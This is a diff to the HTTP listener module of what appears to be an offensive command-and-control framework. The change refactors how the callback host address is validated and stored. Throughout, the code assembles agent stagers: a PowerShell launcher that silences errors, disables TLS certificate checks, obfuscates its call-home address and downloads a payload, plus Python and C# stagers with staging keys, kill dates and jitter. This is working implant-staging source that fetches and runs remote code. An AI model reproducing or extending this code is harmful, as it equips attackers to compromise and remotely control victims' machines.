@@ -159,6 +159,7 @@ class Listener:
         self.thread = None
 
         # optional/specific for this module
+        self.host_address = None
         self.app = None
         self.uris = [
             a.strip("/")
@@ -206,6 +207,11 @@ class Listener:
             for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
         ]
 
+        self.host_address, err = self.mainMenu.listenersv2.validate_listener_address(
+            self.options
+        )
+        if err:
+            return False, err
         return True, None
 
     def generate_launcher(
@@ -232,17 +238,13 @@ class Listener:
             )
             return None
 
-        active_listener = self
-        # extract the set options for this instantiated listener
-        listenerOptions = active_listener.options
-        host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
-        staging_key = listenerOptions["StagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        launcher = self.options["Launcher"]["Value"]
+        staging_key = self.options["StagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
-        cookie = listenerOptions["Cookie"]["Value"]
+        cookie = self.options["Cookie"]["Value"]
 
         if language == "powershell":
             stager = '$ErrorActionPreference = "SilentlyContinue";'
@@ -258,14 +260,14 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
             stager += f"$u='{user_agent}';"
 
-            if "https" in host:
+            if "https" in self.host_address:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
+            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';"
 
             if user_agent.lower() != "none":
                 stager += "$wc.Headers.Add('User-Agent',$u);"
@@ -301,15 +303,6 @@ class Listener:
 
             # TODO: reimplement stager retries?
             # check if we're using IPv6
-            listenerOptions = copy.deepcopy(listenerOptions)
-            bindIP = listenerOptions["BindIP"]["Value"]
-            port = listenerOptions["Port"]["Value"]
-            if ":" in bindIP and "http" in host:
-                if "https" in host:
-                    host = "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
-                else:
-                    host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
-
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
@@ -364,7 +357,7 @@ class Listener:
         if language in ["python", "ironpython"]:
             # Python
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += dedent(
                     """
@@ -381,13 +374,13 @@ class Listener:
                 log.error(p)
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{user_agent}';server='{host}';t='{stage0}';
+                UA='{user_agent}';server='{self.host_address}';t='{stage0}';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -464,12 +457,12 @@ class Listener:
 
         # very basic csharp implementation
         if language == "csharp":
-            workingHours = listenerOptions["WorkingHours"]["Value"]
-            killDate = listenerOptions["KillDate"]["Value"]
+            workingHours = self.options["WorkingHours"]["Value"]
+            killDate = self.options["KillDate"]["Value"]
             customHeaders = profile.split("|")[2:]  # todo: support custom headers
-            delay = listenerOptions["DefaultDelay"]["Value"]
-            jitter = listenerOptions["DefaultJitter"]["Value"]
-            lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+            delay = self.options["DefaultDelay"]["Value"]
+            jitter = self.options["DefaultJitter"]["Value"]
+            lostLimit = self.options["DefaultLostLimit"]["Value"]
 
             raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                 encoding=serialization.Encoding.Raw,
@@ -492,7 +485,7 @@ class Listener:
 
             stager_yaml = stager_yaml.decode("UTF-8")
             stager_yaml = (
-                stager_yaml.replace("{{ REPLACE_ADDRESS }}", host)
+                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                 .replace("{{ REPLACE_STAGINGKEY }}", staging_key)
                 .replace("{{ REPLACE_PROFILE }}", profile)
                 .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
@@ -542,7 +535,6 @@ class Listener:
         stagingKey = listenerOptions["StagingKey"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         killDate = listenerOptions["KillDate"]["Value"]
-        host = listenerOptions["Host"]["Value"]
         customHeaders = profile.split("|")[2:]
 
         # select some random URIs for staging from the main profile
@@ -585,7 +577,7 @@ class Listener:
                 "staging_key": stagingKey,
                 "profile": profile,
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
                 "agent_private_cert_key": private_key_array,
@@ -593,10 +585,6 @@ class Listener:
                 "agent_public_cert_key": public_key_array,
             }
             stager = template.render(template_options)
-
-            # make sure the server ends with "/"
-            if not host.endswith("/"):
-                host += "/"
 
             # Patch in custom Headers
             remove = []
@@ -638,7 +626,7 @@ class Listener:
                 "agent_public_cert_key": self.agent_public_cert_key,
                 "profile": profile,
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
@@ -678,8 +666,6 @@ class Listener:
         jitter = listenerOptions["DefaultJitter"]["Value"]
         profile = listenerOptions["DefaultProfile"]["Value"]
         lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
-        listenerOptions["KillDate"]["Value"]
-        listenerOptions["WorkingHours"]["Value"]
         b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))
 
         if language == "powershell":
@@ -751,8 +737,6 @@ class Listener:
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-        host = listenerOptions["Host"]["Value"]
-
         if not language:
             log.error("listeners/http generate_comms(): no language specified!")
             return None
@@ -774,7 +758,7 @@ class Listener:
             powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
                 "agent_private_cert_key": powershell_array,
                 "agent_public_cert_key": self.agent_public_cert_key,
             }
@@ -791,7 +775,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
